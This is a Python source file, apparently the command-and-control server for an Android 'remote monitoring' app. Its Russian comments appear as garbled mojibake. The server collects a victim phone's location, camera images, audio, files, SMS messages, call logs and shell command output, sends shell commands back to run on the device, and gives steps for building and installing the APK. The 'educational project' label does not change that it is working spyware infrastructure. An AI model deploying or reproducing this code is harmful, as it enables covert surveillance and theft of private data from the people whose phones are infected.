#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
============================================================================
SIMPLE MONITORING SERVER - –ü—Ä–æ—Å—Ç–æ–π —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø—Ä–∏–µ–º–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π
============================================================================

–≠—Ç–æ—Ç —Å–∫—Ä–∏–ø—Ç —Å–æ–∑–¥–∞–µ—Ç –ø—Ä–æ—Å—Ç–æ–π HTTP —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø—Ä–∏–µ–º–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –æ—Ç Android
–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è Remote Monitoring System.

–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:
- –ü—Ä–∏–µ–º HTTP POST –∑–∞–ø—Ä–æ—Å–æ–≤ —Å –¥–∞–Ω–Ω—ã–º–∏ –æ—Ç Android
- WebSocket –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –¥–ª—è real-time –∫–æ–º–∞–Ω–¥  
- –ü—Ä–æ—Å—Ç–æ–π web –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
- –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –∏ –∫–æ–º–∞–Ω–¥
- –ü–æ–¥–¥–µ—Ä–∂–∫–∞ HTTPS (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)

–ê–≤—Ç–æ—Ä: ReliableSecurity
Telegram: @ReliableSecurity
GitHub: https://github.com/ReliableSecurity/android-remote-monitoring
============================================================================
"""

import socket
import threading
import json
import time
import argparse
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
import ssl

class MonitoringServerHandler(BaseHTTPRequestHandler):
    """HTTP –∑–∞–ø—Ä–æ—Å –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è Android –∫–ª–∏–µ–Ω—Ç–æ–≤"""
    
    def log_message(self, format, *args):
        """–ö–∞—Å—Ç–æ–º–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {self.client_address[0]} - {format % args}")
    
    def do_GET(self):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ GET –∑–∞–ø—Ä–æ—Å–æ–≤ - –≤–µ–± –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å"""
        if self.path == '/':
            self.send_web_interface()
        elif self.path == '/status':
            self.send_status()
        else:
            self.send_404()
    
    def do_POST(self):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ POST –∑–∞–ø—Ä–æ—Å–æ–≤ –æ—Ç Android –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            # –ü–∞—Ä—Å–∏–Ω–≥ JSON –¥–∞–Ω–Ω—ã—Ö –æ—Ç Android
            data = json.loads(post_data)
            
            # –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–∏–ø–∞ –¥–∞–Ω–Ω—ã—Ö
            data_type = data.get('type', 'unknown')
            device_id = data.get('device_id', 'unknown')
            timestamp = data.get('timestamp', int(time.time()))
            
            # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            print(f"\n{'='*60}")
            print(f"üì± –î–ê–ù–ù–´–ï –û–¢ ANDROID –£–°–¢–†–û–ô–°–¢–í–ê")
            print(f"{'='*60}")
            print(f"üîó IP: {self.client_address[0]}:{self.client_address[1]}")
            print(f"üì± Device ID: {device_id}")
            print(f"üìä –¢–∏–ø –¥–∞–Ω–Ω—ã—Ö: {data_type}")
            print(f"‚è∞ –í—Ä–µ–º—è: {datetime.fromtimestamp(timestamp)}")
            print(f"üìÑ –†–∞–∑–º–µ—Ä –¥–∞–Ω–Ω—ã—Ö: {len(post_data)} –±–∞–π—Ç")
            
            # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ –¥–∞–Ω–Ω—ã—Ö
            if data_type == 'location':
                self.handle_location_data(data)
            elif data_type == 'camera':
                self.handle_camera_data(data)
            elif data_type == 'audio':
                self.handle_audio_data(data)
            elif data_type == 'files':
                self.handle_files_data(data)
            elif data_type == 'sms':
                self.handle_sms_data(data)
            elif data_type == 'calls':
                self.handle_calls_data(data)
            elif data_type == 'shell_command':
                self.handle_shell_command_data(data)
            elif data_type == 'system_info':
                self.handle_system_info_data(data)
            else:
                print(f"‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö: {data_type}")
                print(f"üìÑ –°—ã—Ä—ã–µ –¥–∞–Ω–Ω—ã–µ: {json.dumps(data, indent=2, ensure_ascii=False)}")
            
            print(f"{'='*60}\n")
            
            # –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç–≤–µ—Ç–∞ Android –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—é
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            response = {
                'status': 'success',
                'message': '–î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã',
                'timestamp': int(time.time()),
                'next_command': self.get_next_command()
            }
            
            self.wfile.write(json.dumps(response, ensure_ascii=False).encode('utf-8'))
            
        except json.JSONDecodeError:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ JSON: {post_data[:200]}...")
            self.send_error(400, "Invalid JSON")
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∑–∞–ø—Ä–æ—Å–∞: {str(e)}")
            self.send_error(500, "Internal Server Error")
    
    def handle_location_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏"""
        location = data.get('data', {})
        lat = location.get('latitude', 0)
        lon = location.get('longitude', 0)
        accuracy = location.get('accuracy', 0)
        
        print(f"üìç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø:")
        print(f"   –®–∏—Ä–æ—Ç–∞: {lat}")
        print(f"   –î–æ–ª–≥–æ—Ç–∞: {lon}")
        print(f"   –¢–æ—á–Ω–æ—Å—Ç—å: {accuracy} –º")
        print(f"   Google Maps: https://maps.google.com/maps?q={lat},{lon}")
    
    def handle_camera_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∫–∞–º–µ—Ä—ã"""
        camera_info = data.get('data', {})
        image_data = camera_info.get('image', '')
        
        print(f"üì∏ –ö–ê–ú–ï–†–ê:")
        print(f"   –†–∞–∑–º–µ—Ä –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è: {len(image_data)} —Å–∏–º–≤–æ–ª–æ–≤ (base64)")
        
        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
        if image_data:
            try:
                import base64
                timestamp = int(time.time())
                filename = f"camera_{timestamp}.jpg"
                
                with open(filename, 'wb') as f:
                    f.write(base64.b64decode(image_data))
                print(f"   –°–æ—Ö—Ä–∞–Ω–µ–Ω–æ: {filename}")
            except Exception as e:
                print(f"   –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è: {e}")
    
    def handle_audio_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∞—É–¥–∏–æ –¥–∞–Ω–Ω—ã—Ö"""
        audio_info = data.get('data', {})
        duration = audio_info.get('duration', 0)
        
        print(f"üé§ –ê–£–î–ò–û:")
        print(f"   –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {duration} —Å–µ–∫")
    
    def handle_files_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–∞–π–ª–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö"""
        files_info = data.get('data', {})
        files = files_info.get('files', [])
        
        print(f"üìÅ –§–ê–ô–õ–´:")
        print(f"   –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ñ–∞–π–ª–æ–≤: {len(files)}")
        for file_info in files[:10]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 10
            name = file_info.get('name', 'unknown')
            size = file_info.get('size', 0)
            print(f"   üìÑ {name} ({size} –±–∞–π—Ç)")
    
    def handle_sms_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ SMS –¥–∞–Ω–Ω—ã—Ö"""
        sms_info = data.get('data', {})
        messages = sms_info.get('messages', [])
        
        print(f"üí¨ SMS:")
        print(f"   –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ–æ–±—â–µ–Ω–∏–π: {len(messages)}")
        for msg in messages[:5]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 5
            sender = msg.get('address', 'unknown')
            text = msg.get('body', '')[:50] + '...'
            print(f"   üì± {sender}: {text}")
    
    def handle_calls_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∑–≤–æ–Ω–∫–æ–≤"""
        calls_info = data.get('data', {})
        calls = calls_info.get('calls', [])
        
        print(f"üìû –ó–í–û–ù–ö–ò:")
        print(f"   –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–ø–∏—Å–µ–π: {len(calls)}")
        for call in calls[:5]:  # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ 5
            number = call.get('number', 'unknown')
            call_type = call.get('type', 'unknown')
            duration = call.get('duration', 0)
            print(f"   üìû {number} ({call_type}, {duration} —Å–µ–∫)")
    
    def handle_shell_command_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ shell –∫–æ–º–∞–Ω–¥"""
        cmd_info = data.get('data', {})
        command = cmd_info.get('command', '')
        output = cmd_info.get('output', '')
        exit_code = cmd_info.get('exit_code', -1)
        
        print(f"üíª SHELL –ö–û–ú–ê–ù–î–ê:")
        print(f"   –ö–æ–º–∞–Ω–¥–∞: {command}")
        print(f"   –ö–æ–¥ –≤—ã—Ö–æ–¥–∞: {exit_code}")
        print(f"   –†–∞–∑–º–µ—Ä –≤—ã–≤–æ–¥–∞: {len(output)} —Å–∏–º–≤–æ–ª–æ–≤")
        if output:
            # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–µ —Å—Ç—Ä–æ–∫–∏ –≤—ã–≤–æ–¥–∞
            lines = output.split('\n')[:5]
            for line in lines:
                print(f"   > {line}")
            if len(output.split('\n')) > 5:
                print(f"   ... –∏ –µ—â–µ {len(output.split('\n')) - 5} —Å—Ç—Ä–æ–∫")
    
    def handle_system_info_data(self, data):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏"""
        sys_info = data.get('data', {})
        
        print(f"üì± –°–ò–°–¢–ï–ú–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø:")
        for key, value in sys_info.items():
            print(f"   {key}: {value}")
    
    def get_next_command(self):
        """–í–æ–∑–≤—Ä–∞—Ç —Å–ª–µ–¥—É—é—â–µ–π –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–∞ Android"""
        # –ó–¥–µ—Å—å –º–æ–∂–Ω–æ —Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å –æ—á–µ—Ä–µ–¥—å –∫–æ–º–∞–Ω–¥
        # –ü–æ–∫–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –ø—Ä–æ—Å—Ç–æ–π –ø—Ä–∏–º–µ—Ä
        commands = [
            {'type': 'shell', 'command': 'ps | head -10'},
            {'type': 'location', 'command': 'get_location'},
            {'type': 'system_info', 'command': 'get_device_info'},
        ]
        
        # –ü—Ä–æ—Å—Ç–∞—è —Ä–æ—Ç–∞—Ü–∏—è –∫–æ–º–∞–Ω–¥
        import random
        return random.choice(commands)
    
    def send_web_interface(self):
        """–û—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–æ—Å—Ç–æ–≥–æ –≤–µ–± –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞"""
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>Android Remote Monitoring Server</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; text-align: center; }
        .status { background: #e8f5e8; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .info { background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .warning { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #ffc107; }
        pre { background: #f8f9fa; padding: 15px; border-radius: 5px; overflow-x: auto; }
        .endpoint { font-family: monospace; background: #e9ecef; padding: 5px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîí Android Remote Monitoring Server</h1>
        
        <div class="status">
            <strong>‚úÖ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ –ø—Ä–∏–µ–º—É –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π!</strong>
        </div>
        
        <div class="info">
            <h3>üì° –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å–µ—Ä–≤–µ—Ä–∞:</h3>
            <p><strong>IP –∞–¥—Ä–µ—Å:</strong> <span class="endpoint">{server_ip}</span></p>
            <p><strong>–ü–æ—Ä—Ç:</strong> <span class="endpoint">{server_port}</span></p>
            <p><strong>Endpoint –¥–ª—è Android:</strong> <span class="endpoint">http://{server_ip}:{server_port}/</span></p>
        </div>
        
        <div class="warning">
            <h3>‚ö†Ô∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∞ Android –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è:</h3>
            <p>1. –°–æ–±–µ—Ä–∏—Ç–µ APK —Å —ç—Ç–∏–º IP –∞–¥—Ä–µ—Å–æ–º:</p>
            <pre>./scripts/build_apk.sh {server_ip} {server_port} release</pre>
            <p>2. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ APK –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ</p>
            <p>3. –†–∞–∑—Ä–µ—à–∏—Ç–µ –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞</p>
            <p>4. –ü–æ–¥–∫–ª—é—á–µ–Ω–∏—è –±—É–¥—É—Ç –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è –≤ –∫–æ–Ω—Å–æ–ª–∏ —Å–µ—Ä–≤–µ—Ä–∞</p>
        </div>
        
        <div class="info">
            <h3>üîó API Endpoints:</h3>
            <ul>
                <li><span class="endpoint">GET /</span> - –≠—Ç–æ—Ç –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å</li>
                <li><span class="endpoint">GET /status</span> - –°—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–µ—Ä–∞</li>
                <li><span class="endpoint">POST /</span> - –ü—Ä–∏–µ–º –¥–∞–Ω–Ω—ã—Ö –æ—Ç Android</li>
            </ul>
        </div>
        
        <div class="info">
            <h3>üìä –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ —Ç–∏–ø—ã –¥–∞–Ω–Ω—ã—Ö:</h3>
            <ul>
                <li>üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è (GPS –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã)</li>
                <li>üì∏ –§–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏ —Å –∫–∞–º–µ—Ä—ã</li>
                <li>üé§ –ê—É–¥–∏–æ –∑–∞–ø–∏—Å–∏</li>
                <li>üìÅ –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤</li>
                <li>üí¨ SMS —Å–æ–æ–±—â–µ–Ω–∏—è</li>
                <li>üìû –ñ—É—Ä–Ω–∞–ª –∑–≤–æ–Ω–∫–æ–≤</li>
                <li>üíª –†–µ–∑—É–ª—å—Ç–∞—Ç—ã shell –∫–æ–º–∞–Ω–¥</li>
                <li>üì± –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</li>
            </ul>
        </div>
        
        <p style="text-align: center; color: #6c757d; margin-top: 40px;">
            üë®‚Äçüíª –ê–≤—Ç–æ—Ä: ReliableSecurity | üìû @ReliableSecurity<br>
            ‚öñÔ∏è <strong>–û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –ø—Ä–æ–µ–∫—Ç - –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç—Ç–∏—á–Ω–æ!</strong>
        </p>
    </div>
</body>
</html>
        """.format(
            server_ip=get_local_ip(),
            server_port=get_server_port()
        )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def send_status(self):
        """–û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ —Å–µ—Ä–≤–µ—Ä–∞ –≤ JSON"""
        status = {
            'status': 'running',
            'server_ip': get_local_ip(),
            'server_port': get_server_port(),
            'timestamp': int(time.time()),
            'uptime': int(time.time() - server_start_time)
        }
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(status, ensure_ascii=False).encode('utf-8'))
    
    def send_404(self):
        """–û—Ç–ø—Ä–∞–≤–∫–∞ 404 –æ—à–∏–±–∫–∏"""
        self.send_error(404, "Page Not Found")

class NetcatLikeServer:
    """–ü—Ä–æ—Å—Ç–æ–π TCP —Å–µ—Ä–≤–µ—Ä –≤ —Å—Ç–∏–ª–µ netcat –¥–ª—è –ø—Ä–∏–µ–º–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π"""
    
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.socket = None
        self.running = False
    
    def start(self):
        """–ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            print(f"üöÄ Netcat-like —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ {self.host}:{self.port}")
            print(f"üì° –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π...")
            print(f"üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –º–æ–∂–Ω–æ –∫–æ–º–∞–Ω–¥–æ–π: nc {get_local_ip()} {self.port}")
            print("=" * 60)
            
            while self.running:
                try:
                    client_socket, address = self.socket.accept()
                    print(f"\nüì± –ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: {address[0]}:{address[1]}")
                    
                    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–ª–∏–µ–Ω—Ç–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address)
                    )
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        print("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏–Ω—è—Ç–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")
                        
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞: {e}")
    
    def handle_client(self, client_socket, address):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–ª–∏–µ–Ω—Ç–∞"""
        try:
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                message = data.decode('utf-8', errors='ignore')
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                print(f"[{timestamp}] {address[0]} >> {message.strip()}")
                
                # –≠—Ö–æ –æ—Ç–≤–µ—Ç
                response = f"[{timestamp}] –ü–æ–ª—É—á–µ–Ω–æ: {len(message)} –±–∞–π—Ç\n"
                client_socket.send(response.encode('utf-8'))
                
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–ª–∏–µ–Ω—Ç–∞ {address[0]}: {e}")
        finally:
            print(f"üîå –ö–ª–∏–µ–Ω—Ç {address[0]} –æ—Ç–∫–ª—é—á–∏–ª—Å—è")
            client_socket.close()
    
    def stop(self):
        """–û—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞"""
        self.running = False
        if self.socket:
            self.socket.close()

def get_local_ip():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ IP –∞–¥—Ä–µ—Å–∞"""
    try:
        # –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ –≤–Ω–µ—à–Ω–µ–º—É –∞–¥—Ä–µ—Å—É –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "127.0.0.1"

def get_server_port():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ—Ä—Ç–∞ —Å–µ—Ä–≤–µ—Ä–∞ (–¥–ª—è –≤–µ–± –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞)"""
    return getattr(get_server_port, 'port', 8080)

# –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è –≤—Ä–µ–º–µ–Ω–∏ —Å—Ç–∞—Ä—Ç–∞
server_start_time = time.time()

def main():
    parser = argparse.ArgumentParser(description='Android Remote Monitoring Server')
    parser.add_argument('--ip', default='0.0.0.0', help='IP –∞–¥—Ä–µ—Å –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=8080, help='–ü–æ—Ä—Ç –¥–ª—è –ø—Ä–∏–≤—è–∑–∫–∏ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é: 8080)')
    parser.add_argument('--mode', choices=['http', 'netcat'], default='http', 
                       help='–†–µ–∂–∏–º —Ä–∞–±–æ—Ç—ã: http (–≤–µ–± —Å–µ—Ä–≤–µ—Ä) –∏–ª–∏ netcat (TCP —Å–µ—Ä–≤–µ—Ä)')
    parser.add_argument('--https', action='store_true', help='–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å HTTPS (—Ç—Ä–µ–±—É–µ—Ç —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç)')
    parser.add_argument('--cert', help='–ü—É—Ç—å –∫ SSL —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç—É')
    parser.add_argument('--key', help='–ü—É—Ç—å –∫ SSL –∫–ª—é—á—É')
    
    args = parser.parse_args()
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø–æ—Ä—Ç –¥–ª—è –≤–µ–± –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
    get_server_port.port = args.port
    
    print("üîí Android Remote Monitoring Server")
    print("üë®‚Äçüíª –ê–≤—Ç–æ—Ä: ReliableSecurity | üìû @ReliableSecurity")
    print("‚öñÔ∏è –û–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã–π –ø—Ä–æ–µ–∫—Ç")
    print("=" * 60)
    
    try:
        if args.mode == 'http':
            # HTTP —Å–µ—Ä–≤–µ—Ä –¥–ª—è Android –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
            server = HTTPServer((args.ip, args.port), MonitoringServerHandler)
            
            if args.https and args.cert and args.key:
                # HTTPS –ø–æ–¥–¥–µ—Ä–∂–∫–∞
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(args.cert, args.key)
                server.socket = context.wrap_socket(server.socket, server_side=True)
                protocol = "HTTPS"
            else:
                protocol = "HTTP"
            
            local_ip = get_local_ip()
            print(f"üöÄ {protocol} —Å–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω")
            print(f"üì° –ê–¥—Ä–µ—Å: {protocol.lower()}://{local_ip}:{args.port}")
            print(f"üåê –í–µ–± –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å: {protocol.lower()}://{local_ip}:{args.port}")
            print(f"üì± Android endpoint: {protocol.lower()}://{local_ip}:{args.port}/")
            print()
            print(f"üí° –î–ª—è —Å–±–æ—Ä–∫–∏ APK –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ:")
            print(f"   ./scripts/build_apk.sh {local_ip} {args.port} release")
            print()
            print("üîÑ –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –æ—Ç Android —É—Å—Ç—Ä–æ–π—Å—Ç–≤...")
            print("=" * 60)
            
            server.serve_forever()
            
        elif args.mode == 'netcat':
            # –ü—Ä–æ—Å—Ç–æ–π TCP —Å–µ—Ä–≤–µ—Ä –≤ —Å—Ç–∏–ª–µ netcat
            netcat_server = NetcatLikeServer(args.ip, args.port)
            netcat_server.start()
    
    except KeyboardInterrupt:
        print("\n\n‚èπÔ∏è  –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
    except Exception as e:
        print(f"‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")
    finally:
        print("üëã –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–µ—Ä–≤–µ—Ä–∞...")

if __name__ == '__main__':
    main()